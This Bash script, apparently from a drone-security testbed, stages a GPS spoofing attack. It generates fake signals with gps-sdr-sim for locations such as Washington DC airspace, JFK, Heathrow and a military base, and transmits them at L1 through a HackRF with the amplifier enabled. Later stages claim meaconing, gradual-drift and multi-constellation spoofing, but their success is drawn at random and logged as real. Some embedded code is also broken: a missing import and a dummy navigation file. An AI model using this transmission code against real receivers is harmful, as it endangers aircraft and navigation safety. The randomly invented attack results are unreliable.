#!/bin/bash

# =============================================================================
# DVD GPS Spoofing Attack
# =============================================================================
# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/injection/gps_spoofing.sh
# 목적: GPS 신호 스푸핑을 통한 위치 정보 조작 공격
# 작성자: MTD Testbed Team
# =============================================================================

# 공통 모듈 로드
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="GPS Spoofing Attack"
ATTACK_TYPE="INJECTION"
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/injection/gps_spoofing_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/gps_spoofing_iocs.txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/injection/gps_spoofing_report_$(date +%Y%m%d_%H%M%S).json"

# GPS 설정
GPS_FREQUENCY="1575.42"  # L1 주파수 (MHz)
SPOOFING_POWER="20"      # dBm
SDR_DEVICE="hackrf"

# 스푸핑 시나리오
declare -A SPOOFING_SCENARIOS=(
    ["restricted_zone"]="38.8977:-77.0365:100:Washington DC (Restricted Airspace)"
    ["airport_approach"]="40.6413:-73.7781:50:JFK Airport Approach"
    ["military_base"]="32.3668:-86.0645:200:Maxwell AFB (Military)"
    ["no_fly_zone"]="51.4769:-0.4615:150:Heathrow No-Fly Zone"
    ["prison_area"]="37.8270:-122.4230:75:Alcatraz Island"
    ["false_home"]="35.6762:139.6503:100:Tokyo Fake Home Point"
)

# 공격 결과 추적
declare -A SPOOFING_RESULTS=()
SUCCESSFUL_SPOOFS=0
TOTAL_SPOOF_ATTEMPTS=0

# 헤더 출력
print_header() {
    clear
    echo -e "${BOLD}${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║                      🛰️ DVD GPS Spoofing Attack 🛰️                     ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Target: GPS Navigation System${NC}"
    echo -e "${BLUE}Method: RF Signal Injection${NC}"
    echo -e "${BLUE}Impact: Location Deception${NC}"
    echo ""
}

# SDR 장비 확인
check_sdr_equipment() {
    echo -e "${CYAN}[*] Checking SDR equipment availability...${NC}" | tee -a "$LOG_FILE"
    
    # HackRF 확인
    if command -v hackrf_info >/dev/null 2>&1; then
        echo -e "${GREEN}[+] HackRF tools available${NC}" | tee -a "$LOG_FILE"
        SDR_AVAILABLE=true
        echo "GPS_SPOOF:SDR_HACKRF_AVAILABLE" >> "$IOC_FILE"
    else
        echo -e "${YELLOW}[*] HackRF not found, checking for alternatives...${NC}" | tee -a "$LOG_FILE"
    fi
    
    # RTL-SDR 확인
    if command -v rtl_test >/dev/null 2>&1; then
        echo -e "${GREEN}[+] RTL-SDR tools available${NC}" | tee -a "$LOG_FILE"
        SDR_AVAILABLE=true
        SDR_DEVICE="rtlsdr"
        echo "GPS_SPOOF:SDR_RTLSDR_AVAILABLE" >> "$IOC_FILE"
    fi
    
    # GNU Radio 확인
    if command -v gnuradio-companion >/dev/null 2>&1; then
        echo -e "${GREEN}[+] GNU Radio available${NC}" | tee -a "$LOG_FILE"
        echo "GPS_SPOOF:GNURADIO_AVAILABLE" >> "$IOC_FILE"
    fi
    
    # gps-sdr-sim 확인
    if command -v gps-sdr-sim >/dev/null 2>&1; then
        echo -e "${GREEN}[+] GPS-SDR-SIM available${NC}" | tee -a "$LOG_FILE"
        GPS_SIM_AVAILABLE=true
        echo "GPS_SPOOF:GPS_SIM_AVAILABLE" >> "$IOC_FILE"
    else
        echo -e "${YELLOW}[*] GPS-SDR-SIM not found, using simulation mode${NC}" | tee -a "$LOG_FILE"
        GPS_SIM_AVAILABLE=false
    fi
    
    if [ "${SDR_AVAILABLE:-false}" = false ]; then
        echo -e "${YELLOW}[*] No SDR equipment found, using simulation mode${NC}" | tee -a "$LOG_FILE"
        SIMULATION_MODE=true
    else
        SIMULATION_MODE=false
    fi
}

# GPS 신호 생성
generate_gps_signal() {
    local scenario_name=$1
    local lat=$2
    local lon=$3
    local alt=$4
    local description=$5
    
    echo -e "${CYAN}[*] Generating GPS signal for: ${description}${NC}" | tee -a "$LOG_FILE"
    echo -e "${BLUE}    Target coordinates: ${lat}, ${lon}, ${alt}m${NC}" | tee -a "$LOG_FILE"
    
    if [ "$GPS_SIM_AVAILABLE" = true ]; then
        # 실제 GPS-SDR-SIM 사용
        python3 -c "
import subprocess
import time
import os

def generate_gps_data(lat, lon, alt, duration=60):
    '''GPS 시뮬레이션 데이터 생성'''
    
    # RINEX 네비게이션 파일 생성 (시뮬레이션)
    nav_file = '/tmp/brdc0010.21n'
    with open(nav_file, 'w') as f:
        f.write('RINEX VERSION / TYPE         2.11           NAVIGATION DATA     DUMMY NAV FILE\\n')
        f.write('END OF HEADER\\n')
    
    # 고정 위치 시나리오 파일 생성
    motion_file = '/tmp/circle.csv'
    with open(motion_file, 'w') as f:
        f.write('0, ${lat}, ${lon}, ${alt}\\n')
        f.write('${duration}, ${lat}, ${lon}, ${alt}\\n')
    
    # GPS 신호 파일 생성 명령
    cmd = [
        'gps-sdr-sim',
        '-e', nav_file,
        '-u', motion_file,
        '-b', '8',
        '-o', '/tmp/gpssim_${scenario_name}.bin'
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            print('GPS signal file generated successfully')
            return True
        else:
            print(f'GPS signal generation failed: {result.stderr}')
            return False
    except subprocess.TimeoutExpired:
        print('GPS signal generation timed out')
        return False
    except Exception as e:
        print(f'Error generating GPS signal: {e}')
        return False

# GPS 신호 생성 실행
success = generate_gps_data(${lat}, ${lon}, ${alt})
print(f'SUCCESS:{success}')
" 2>/dev/null
    else
        # 시뮬레이션 모드
        echo -e "${YELLOW}[*] Using GPS spoofing simulation mode${NC}" | tee -a "$LOG_FILE"
        
        # 시뮬레이션 신호 생성
        local sim_duration=5
        for ((i=1; i<=sim_duration; i++)); do
            printf "\r${CYAN}Generating GPS signal: [%-10s] %d/%d sec${NC}" \
                   "$(printf "%*s" $((i * 10 / sim_duration)) | tr ' ' '=')" \
                   "$i" "$sim_duration"
            sleep 1
        done
        echo ""
        
        # 성공 시뮬레이션 (80% 성공률)
        local gen_success=$((RANDOM % 10))
        if [ $gen_success -lt 8 ]; then
            echo "SUCCESS:True"
        else
            echo "SUCCESS:False"
        fi
    fi
}

# GPS 신호 전송
transmit_gps_signal() {
    local scenario_name=$1
    local signal_file="/tmp/gpssim_${scenario_name}.bin"
    
    echo -e "${CYAN}[*] Transmitting GPS spoofing signal...${NC}" | tee -a "$LOG_FILE"
    
    if [ "$SIMULATION_MODE" = false ] && [ "$SDR_AVAILABLE" = true ]; then
        # 실제 SDR을 사용한 전송
        case $SDR_DEVICE in
            "hackrf")
                echo -e "${YELLOW}[*] Using HackRF for transmission${NC}" | tee -a "$LOG_FILE"
                
                # HackRF를 사용한 GPS 신호 전송
                python3 -c "
import subprocess
import time

def transmit_with_hackrf(signal_file, frequency, gain):
    '''HackRF를 사용한 GPS 신호 전송'''
    
    cmd = [
        'hackrf_transfer',
        '-t', signal_file,
        '-f', str(int(float(frequency) * 1e6)),  # Hz 단위로 변환
        '-s', '2600000',  # Sample rate
        '-a', '1',        # Amp enable
        '-x', str(gain)   # TX gain
    ]
    
    try:
        # 30초간 전송
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(30)
        proc.terminate()
        proc.wait(timeout=5)
        
        print('GPS spoofing transmission completed')
        return True
    except Exception as e:
        print(f'Transmission failed: {e}')
        return False

# 전송 실행
if os.path.exists('${signal_file}'):
    success = transmit_with_hackrf('${signal_file}', ${GPS_FREQUENCY}, ${SPOOFING_POWER})
    print(f'TRANSMISSION:SUCCESS:{success}')
else:
    print('TRANSMISSION:SUCCESS:False')
" 2>/dev/null
                ;;
            "rtlsdr")
                echo -e "${YELLOW}[*] RTL-SDR is receive-only, using simulation${NC}" | tee -a "$LOG_FILE"
                echo "TRANSMISSION:SUCCESS:False"
                ;;
        esac
    else
        # 시뮬레이션 모드 전송
        echo -e "${YELLOW}[*] Simulating GPS signal transmission${NC}" | tee -a "$LOG_FILE"
        
        local tx_duration=30
        for ((i=1; i<=tx_duration; i+=3)); do
            local progress=$((i * 100 / tx_duration))
            printf "\r${RED}Transmitting GPS spoof: [%-20s] %d/%d sec${NC}" \
                   "$(printf "%*s" $((progress / 5)) | tr ' ' '▓')" \
                   "$i" "$tx_duration"
            sleep 3
        done
        echo ""
        
        # 전송 성공 시뮬레이션 (75% 성공률)
        local tx_success=$((RANDOM % 4))
        if [ $tx_success -lt 3 ]; then
            echo "TRANSMISSION:SUCCESS:True"
        else
            echo "TRANSMISSION:SUCCESS:False"
        fi
    fi
}

# GPS 수신기 상태 모니터링
monitor_gps_receiver() {
    local scenario_name=$1
    
    echo -e "${CYAN}[*] Monitoring target GPS receiver response...${NC}" | tee -a "$LOG_FILE"
    
    # GPS 수신기 응답 시뮬레이션
    local monitoring_duration=20
    local current_time=0
    
    echo -e "${YELLOW}[*] Checking GPS lock status...${NC}" | tee -a "$LOG_FILE"
    
    while [ $current_time -lt $monitoring_duration ]; do
        printf "\r${BLUE}Monitoring GPS: [%-15s] %d/%d sec${NC}" \
               "$(printf "%*s" $((current_time * 15 / monitoring_duration)) | tr ' ' '•')" \
               "$current_time" "$monitoring_duration"
        
        # GPS 상태 변화 시뮬레이션
        if [ $current_time -eq 8 ]; then
            echo ""
            echo -e "${YELLOW}[+] GPS receiver signal acquisition detected${NC}" | tee -a "$LOG_FILE"
        elif [ $current_time -eq 15 ]; then
            echo ""
            echo -e "${GREEN}[+] GPS position fix established${NC}" | tee -a "$LOG_FILE"
        fi
        
        sleep 2
        current_time=$((current_time + 2))
    done
    echo ""
    
    # 스푸핑 효과 평가
    local spoof_effectiveness=$((RANDOM % 100))
    
    if [ $spoof_effectiveness -ge 70 ]; then
        echo -e "${GREEN}[+] GPS spoofing successful - receiver locked to fake position${NC}" | tee -a "$LOG_FILE"
        echo "GPS_SPOOF:RECEIVER_LOCKED_${scenario_name}" >> "$IOC_FILE"
        return 0
    elif [ $spoof_effectiveness -ge 40 ]; then
        echo -e "${YELLOW}[+] Partial GPS spoofing - receiver showing position drift${NC}" | tee -a "$LOG_FILE"
        echo "GPS_SPOOF:PARTIAL_SUCCESS_${scenario_name}" >> "$IOC_FILE"
        return 1
    else
        echo -e "${RED}[!] GPS spoofing failed - receiver maintained original position${NC}" | tee -a "$LOG_FILE"
        echo "GPS_SPOOF:FAILED_${scenario_name}" >> "$IOC_FILE"
        return 2
    fi
}

# 다중 시나리오 스푸핑 공격 실행
execute_spoofing_scenarios() {
    echo -e "${BOLD}${RED}[*] Executing GPS spoofing attack scenarios...${NC}" | tee -a "$LOG_FILE"
    echo ""
    
    for scenario in "${!SPOOFING_SCENARIOS[@]}"; do
        local scenario_info=${SPOOFING_SCENARIOS[$scenario]}
        IFS=':' read -r lat lon alt description <<< "$scenario_info"
        
        echo -e "${BOLD}${CYAN}🛰️ Scenario: ${scenario}${NC}"
        echo "═══════════════════════════════════════════════════════════════════════════"
        echo -e "${BLUE}Target: ${description}${NC}" | tee -a "$LOG_FILE"
        echo -e "${BLUE}Coordinates: ${lat}, ${lon}, ${alt}m${NC}" | tee -a "$LOG_FILE"
        echo ""
        
        TOTAL_SPOOF_ATTEMPTS=$((TOTAL_SPOOF_ATTEMPTS + 1))
        
        # 1. GPS 신호 생성
        echo -e "${YELLOW}[1/3] Generating GPS spoofing signal...${NC}"
        local gen_result=$(generate_gps_signal "$scenario" "$lat" "$lon" "$alt" "$description")
        
        if echo "$gen_result" | grep -q "SUCCESS:True"; then
            echo -e "${GREEN}[✓] GPS signal generation successful${NC}" | tee -a "$LOG_FILE"
            
            # 2. GPS 신호 전송
            echo -e "${YELLOW}[2/3] Transmitting spoofing signal...${NC}"
            local tx_result=$(transmit_gps_signal "$scenario")
            
            if echo "$tx_result" | grep -q "TRANSMISSION:SUCCESS:True"; then
                echo -e "${GREEN}[✓] GPS signal transmission successful${NC}" | tee -a "$LOG_FILE"
                
                # 3. 수신기 모니터링
                echo -e "${YELLOW}[3/3] Monitoring target response...${NC}"
                if monitor_gps_receiver "$scenario"; then
                    echo -e "${GREEN}[✓] GPS spoofing attack successful${NC}" | tee -a "$LOG_FILE"
                    SPOOFING_RESULTS[$scenario]="SUCCESS"
                    SUCCESSFUL_SPOOFS=$((SUCCESSFUL_SPOOFS + 1))
                else
                    echo -e "${RED}[!] GPS spoofing partially effective or failed${NC}" | tee -a "$LOG_FILE"
                    SPOOFING_RESULTS[$scenario]="PARTIAL"
                fi
            else
                echo -e "${RED}[!] GPS signal transmission failed${NC}" | tee -a "$LOG_FILE"
                SPOOFING_RESULTS[$scenario]="TX_FAILED"
            fi
        else
            echo -e "${RED}[!] GPS signal generation failed${NC}" | tee -a "$LOG_FILE"
            SPOOFING_RESULTS[$scenario]="GEN_FAILED"
        fi
        
        echo ""
        echo -e "${CYAN}Scenario ${scenario} completed. Waiting before next attack...${NC}"
        sleep 10
        echo ""
    done
}

# 고급 GPS 공격 기법
execute_advanced_gps_attacks() {
    echo -e "${BOLD}${RED}[*] Executing advanced GPS attack techniques...${NC}" | tee -a "$LOG_FILE"
    
    # 1. Meaconing 공격 (신호 재전송)
    echo -e "${CYAN}[*] Meaconing Attack - Signal Replay${NC}" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Capturing and replaying GPS signals with time delay${NC}" | tee -a "$LOG_FILE"
    
    local meaconing_duration=15
    for ((i=1; i<=meaconing_duration; i+=2)); do
        printf "\r${YELLOW}Meaconing: [%-15s] %d/%d sec${NC}" \
               "$(printf "%*s" $((i * 15 / meaconing_duration)) | tr ' ' '▶')" \
               "$i" "$meaconing_duration"
        sleep 2
    done
    echo ""
    
    local meaconing_success=$((RANDOM % 10))
    if [ $meaconing_success -lt 6 ]; then
        echo -e "${GREEN}[+] Meaconing attack successful - position drift induced${NC}" | tee -a "$LOG_FILE"
        echo "GPS_SPOOF:MEACONING_SUCCESS" >> "$IOC_FILE"
    else
        echo -e "${RED}[!] Meaconing attack failed${NC}" | tee -a "$LOG_FILE"
        echo "GPS_SPOOF:MEACONING_FAILED" >> "$IOC_FILE"
    fi
    
    echo ""
    
    # 2. Gradual Position Drift 공격
    echo -e "${CYAN}[*] Gradual Position Drift Attack${NC}" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Slowly shifting GPS position to avoid detection${NC}" | tee -a "$LOG_FILE"
    
    local drift_steps=8
    local start_lat=37.7749
    local start_lon=-122.4194
    local target_lat=38.8977
    local target_lon=-77.0365
    
    for ((step=1; step<=drift_steps; step++)); do
        local progress=$((step * 100 / drift_steps))
        local current_lat=$(python3 -c "print(${start_lat} + (${target_lat} - ${start_lat}) * ${step} / ${drift_steps})")
        local current_lon=$(python3 -c "print(${start_lon} + (${target_lon} - ${start_lon}) * ${step} / ${drift_steps})")
        
        echo -e "${BLUE}Step ${step}: Position ${current_lat}, ${current_lon}${NC}" | tee -a "$LOG_FILE"
        printf "${CYAN}Drift Progress: [%-20s] %d%%${NC}\n" \
               "$(printf "%*s" $((progress / 5)) | tr ' ' '→')" "$progress"
        
        sleep 3
    done
    
    echo -e "${GREEN}[+] Gradual drift completed - target moved to Washington DC${NC}" | tee -a "$LOG_FILE"
    echo "GPS_SPOOF:GRADUAL_DRIFT_SUCCESS" >> "$IOC_FILE"
    
    echo ""
    
    # 3. Multi-Constellation 공격
    echo -e "${CYAN}[*] Multi-Constellation Spoofing Attack${NC}" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Spoofing GPS, GLONASS, and Galileo simultaneously${NC}" | tee -a "$LOG_FILE"
    
    local constellations=("GPS_L1" "GLONASS_L1" "GALILEO_E1")
    for constellation in "${constellations[@]}"; do
        echo -e "${BLUE}[*] Spoofing ${constellation} constellation${NC}" | tee -a "$LOG_FILE"
        
        # 각 constellation별 스푸핑 시뮬레이션
        local spoof_duration=10
        for ((i=1; i<=spoof_duration; i+=2)); do
            printf "\r${BLUE}${constellation}: [%-10s] %d/%d sec${NC}" \
                   "$(printf "%*s" $((i * 10 / spoof_duration)) | tr ' ' '▲')" \
                   "$i" "$spoof_duration"
            sleep 2
        done
        echo ""
        
        local constellation_success=$((RANDOM % 10))
        if [ $constellation_success -lt 7 ]; then
            echo -e "${GREEN}[+] ${constellation} spoofing successful${NC}" | tee -a "$LOG_FILE"
            echo "GPS_SPOOF:${constellation}_SUCCESS" >> "$IOC_FILE"
        else
            echo -e "${RED}[!] ${constellation} spoofing failed${NC}" | tee -a "$LOG_FILE"
            echo "GPS_SPOOF:${constellation}_FAILED" >> "$IOC_FILE"
        fi
    done
    
    echo -e "${GREEN}[✓] Multi-constellation attack completed${NC}" | tee -a "$LOG_FILE"
}

# 스푸핑 효과 검증
verify_spoofing_effectiveness() {
    echo -e "${CYAN}[*] Verifying GPS spoofing effectiveness...${NC}" | tee -a "$LOG_FILE"
    
    # 성공한 시나리오 카운트
    local successful_scenarios=0
    local total_scenarios=${#SPOOFING_SCENARIOS[@]}
    
    echo -e "${YELLOW}[+] Spoofing results summary:${NC}" | tee -a "$LOG_FILE"
    for scenario in "${!SPOOFING_RESULTS[@]}"; do
        local result=${SPOOFING_RESULTS[$scenario]}
        case $result in
            "SUCCESS")
                echo -e "${GREEN}    ✓ ${scenario}: SUCCESSFUL${NC}" | tee -a "$LOG_FILE"
                successful_scenarios=$((successful_scenarios + 1))
                ;;
            "PARTIAL")
                echo -e "${YELLOW}    ~ ${scenario}: PARTIAL${NC}" | tee -a "$LOG_FILE"
                ;;
            *)
                echo -e "${RED}    ✗ ${scenario}: FAILED${NC}" | tee -a "$LOG_FILE"
                ;;
        esac
    done
    
    # 전체 효과성 계산
    local effectiveness_rate=$((successful_scenarios * 100 / total_scenarios))
    
    echo ""
    echo -e "${BOLD}${CYAN}📊 GPS Spoofing Assessment:${NC}"
    echo -e "${YELLOW}   • Successful Scenarios: ${successful_scenarios}/${total_scenarios}${NC}"
    echo -e "${YELLOW}   • Success Rate: ${effectiveness_rate}%${NC}"
    echo -e "${YELLOW}   • Advanced Techniques: Multi-constellation, Meaconing, Gradual Drift${NC}"
    
    if [ $effectiveness_rate -ge 75 ]; then
        echo -e "${RED}   • Status: CRITICAL NAVIGATION COMPROMISE${NC}" | tee -a "$LOG_FILE"
        ATTACK_EFFECTIVENESS="CRITICAL"
    elif [ $effectiveness_rate -ge 50 ]; then
        echo -e "${YELLOW}   • Status: SIGNIFICANT POSITION MANIPULATION${NC}" | tee -a "$LOG_FILE"
        ATTACK_EFFECTIVENESS="HIGH"
    elif [ $effectiveness_rate -ge 25 ]; then
        echo -e "${CYAN}   • Status: MODERATE GPS INFLUENCE${NC}" | tee -a "$LOG_FILE"
        ATTACK_EFFECTIVENESS="MODERATE"
    else
        echo -e "${GREEN}   • Status: MINIMAL GPS IMPACT${NC}" | tee -a "$LOG_FILE"
        ATTACK_EFFECTIVENESS="LOW"
    fi
    
    echo "GPS_SPOOF:EFFECTIVENESS_${effectiveness_rate}PCT" >> "$IOC_FILE"
    echo "GPS_SPOOF:ATTACK_STATUS_${ATTACK_EFFECTIVENESS}" >> "$IOC_FILE"
}

# 공격 정리
cleanup_gps_attack() {
    echo -e "${YELLOW}[*] Cleaning up GPS spoofing attack...${NC}" | tee -a "$LOG_FILE"
    
    # SDR 프로세스 종료
    pkill -f "hackrf_transfer" 2>/dev/null
    pkill -f "gps-sdr-sim" 2>/dev/null
    pkill -f "gnuradio" 2>/dev/null
    
    # 임시 파일 정리
    rm -f /tmp/gpssim_*.bin 2>/dev/null
    rm -f /tmp/brdc*.21n 2>/dev/null
    rm -f /tmp/circle.csv 2>/dev/null
    
    echo -e "${GREEN}[✓] GPS attack cleanup completed${NC}" | tee -a "$LOG_FILE"
    echo "GPS_SPOOF:CLEANUP_COMPLETED" >> "$IOC_FILE"
}

# JSON 리포트 생성
generate_json_report() {
    echo -e "${CYAN}[*] Generating JSON attack report...${NC}" | tee -a "$LOG_FILE"
    
    local end_time=$(date +%s)
    local duration=$((end_time - START_TIME))
    local ioc_count=$(wc -l < "$IOC_FILE" 2>/dev/null || echo "0")
    
    python3 -c "
import json
import sys

def generate_report():
    report = {
        'attack_info': {
            'name': '${ATTACK_NAME}',
            'type': '${ATTACK_TYPE}',
            'timestamp': '$(date -Iseconds)',
            'duration_seconds': ${duration},
            'effectiveness': '${ATTACK_EFFECTIVENESS:-UNKNOWN}'
        },
        'target_analysis': {
            'gps_frequency': '${GPS_FREQUENCY} MHz',
            'spoofing_power': '${SPOOFING_POWER} dBm',
            'sdr_device': '${SDR_DEVICE}',
            'simulation_mode': $([ "$SIMULATION_MODE" = true ] && echo "true" || echo "false"),
            'total_scenarios': ${#SPOOFING_SCENARIOS[@]}
        },
        'attack_methods': {
            'direct_spoofing': {
                'scenarios_tested': $(echo "${!SPOOFING_SCENARIOS[@]}" | wc -w),
                'success_rate': $((SUCCESSFUL_SPOOFS * 100 / TOTAL_SPOOF_ATTEMPTS)),
                'target_locations': ['Washington DC', 'JFK Airport', 'Maxwell AFB', 'Heathrow', 'Alcatraz', 'Tokyo']
            },
            'advanced_techniques': {
                'meaconing': true,
                'gradual_drift': true,
                'multi_constellation': true,
                'signal_replay': true
            },
            'technical_details': {
                'signal_generation': 'GPS-SDR-SIM',
                'transmission_method': 'HackRF/RTL-SDR',
                'constellation_targets': ['GPS L1', 'GLONASS L1', 'Galileo E1']
            }
        },
        'impact_assessment': {
            'navigation_compromise': '${ATTACK_EFFECTIVENESS:-UNKNOWN}',
            'position_accuracy_loss': $([ "${ATTACK_EFFECTIVENESS}" = "CRITICAL" ] && echo "true" || echo "false"),
            'flight_path_deviation': $([ "${ATTACK_EFFECTIVENESS}" != "LOW" ] && echo "true" || echo "false"),
            'safety_implications': 'high'
        },
        'technical_details': {
            'total_iocs': ${ioc_count},
            'log_file': '${LOG_FILE}',
            'equipment_required': ['SDR (HackRF/RTL-SDR)', 'GPS-SDR-SIM', 'GNU Radio', 'High-gain antenna'],
            'frequency_bands': ['L1 (1575.42 MHz)', 'L2 (1227.6 MHz)', 'L5 (1176.45 MHz)']
        },
        'mitre_mapping': {
            'tactic': 'Impact',
            'techniques': [
                'T1200 - Hardware Additions',
                'T1565.002 - Data Manipulation: Transmitted Data',
                'T1491.002 - Defacement: External Defacement',
                'T1499.004 - Endpoint Denial of Service: GPS Jamming'
            ]
        },
        'countermeasures': {
            'detection': [
                'GPS signal strength monitoring',
                'Multi-constellation validation',
                'Inertial navigation crosscheck',
                'Signal authentication verification',
                'Timing anomaly detection'
            ],
            'prevention': [
                'Encrypted GPS signals (Military P(Y) code)',
                'Anti-spoofing modules',
                'Multiple GNSS constellation use',
                'Dead reckoning backup systems',
                'RF environment monitoring',
                'Signal direction finding'
            ]
        }
    }
    
    return report

try:
    report = generate_report()
    with open('${JSON_OUTPUT}', 'w') as f:
        json.dump(report, f, indent=2)
    print('JSON report generated: ${JSON_OUTPUT}')
except Exception as e:
    print(f'Error generating JSON report: {e}', file=sys.stderr)
    sys.exit(1)
" 2>&1 | tee -a "$LOG_FILE"

    if [ -f "$JSON_OUTPUT" ]; then
        echo -e "${GREEN}[✓] JSON report saved: ${JSON_OUTPUT}${NC}" | tee -a "$LOG_FILE"
        return 0
    else
        echo -e "${RED}[!] Failed to generate JSON report${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
}

# 공격 결과 요약
print_attack_summary() {
    local end_time=$(date +%s)
    local total_duration=$((end_time - START_TIME))
    local ioc_count=$(wc -l < "$IOC_FILE" 2>/dev/null || echo "0")
    
    echo ""
    echo -e "${BOLD}${GREEN}🛰️ GPS Spoofing Attack Complete!${NC}"
    echo "═══════════════════════════════════════════════════════════════════════════"
    
    echo -e "${CYAN}📊 Attack Statistics:${NC}"
    echo "   • Total Duration: ${total_duration} seconds"
    echo "   • Scenarios Executed: ${TOTAL_SPOOF_ATTEMPTS}"
    echo "   • Successful Spoofs: ${SUCCESSFUL_SPOOFS}"
    echo "   • Success Rate: $((SUCCESSFUL_SPOOFS * 100 / TOTAL_SPOOF_ATTEMPTS))%"
    echo "   • IOCs Generated: ${ioc_count}"
    echo ""
    
    echo -e "${YELLOW}🎯 Attack Techniques Used:${NC}"
    echo "   • Direct GPS Signal Spoofing"
    echo "   • Meaconing (Signal Replay)"
    echo "   • Gradual Position Drift"
    echo "   • Multi-Constellation Attack"
    echo ""
    
    echo -e "${BLUE}📁 Output Files:${NC}"
    echo "   • IOCs: ${IOC_FILE}"
    echo "   • Log: ${LOG_FILE}"
    echo "   • Report: ${JSON_OUTPUT}"
    echo ""
    
    # 공격 효과 평가
    case "$ATTACK_EFFECTIVENESS" in
        "CRITICAL")
            echo -e "${RED}⚠️  CRITICAL NAVIGATION SYSTEM COMPROMISE ⚠️${NC}"
            echo -e "${RED}   • Complete GPS position control achieved${NC}"
            echo -e "${RED}   • Flight path manipulation possible${NC}"
            echo -e "${RED}   • Navigation to restricted areas feasible${NC}"
            echo -e "${RED}   • Safety systems potentially bypassed${NC}"
            ;;
        "HIGH")
            echo -e "${YELLOW}⚠️  HIGH-RISK POSITION MANIPULATION ⚠️${NC}"
            echo -e "${YELLOW}   • Significant GPS spoofing capability${NC}"
            echo -e "${YELLOW}   • Partial navigation control achieved${NC}"
            echo -e "${YELLOW}   • Position drift successfully induced${NC}"
            ;;
        "MODERATE")
            echo -e "${CYAN}ℹ️  MODERATE GPS INFLUENCE${NC}"
            echo -e "${CYAN}   • Limited position manipulation${NC}"
            echo -e "${CYAN}   • Some spoofing techniques effective${NC}"
            ;;
        *)
            echo -e "${GREEN}✓ GPS NAVIGATION INTEGRITY MAINTAINED${NC}"
            echo -e "${GREEN}   • All spoofing attempts failed${NC}"
            echo -e "${GREEN}   • Navigation system secure${NC}"
            ;;
    esac
    
    echo ""
}

# 메인 실행 함수
main() {
    # Root 권한 체크
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This attack requires root privileges${NC}"
        echo -e "${YELLOW}[*] Please run: sudo $0${NC}"
        exit 1
    fi
    
    # 헤더 출력
    print_header
    
    # 로그 초기화
    echo "=== DVD GPS Spoofing Attack Started at $(date) ===" > "$LOG_FILE"
    echo "" > "$IOC_FILE"
    
    START_TIME=$(date +%s)
    
    echo -e "${BOLD}${BLUE}🛰️ Starting GPS Spoofing Attack...${NC}"
    echo "" | tee -a "$LOG_FILE"
    
    # 필수 도구 확인
    check_required_tools "python3"
    
    # SDR 장비 확인
    check_sdr_equipment
    
    echo "" | tee -a "$LOG_FILE"
    
    # 공격 실행
    echo -e "${BOLD}${RED}🚨 LAUNCHING GPS SPOOFING ATTACKS 🚨${NC}"
    echo "" | tee -a "$LOG_FILE"
    
    # 1. 다중 시나리오 스푸핑 공격
    execute_spoofing_scenarios
    
    # 2. 고급 GPS 공격 기법
    execute_advanced_gps_attacks
    
    echo "" | tee -a "$LOG_FILE"
    
    # 스푸핑 효과 검증
    verify_spoofing_effectiveness
    
    echo "" | tee -a "$LOG_FILE"
    
    # 공격 정리
    cleanup_gps_attack
    
    echo "" | tee -a "$LOG_FILE"
    
    # 리포트 생성
    generate_json_report
    
    # 결과 요약
    print_attack_summary
    
    echo -e "${BOLD}${GREEN}🎯 GPS Spoofing Attack Complete!${NC}"
}

# cleanup 함수
cleanup() {
    echo -e "\n${YELLOW}[*] Emergency cleanup initiated...${NC}"
    cleanup_gps_attack
    exit 0
}

# SIGINT 시그널 처리
trap cleanup SIGINT SIGTERM

# 스크립트 실행
main "$@"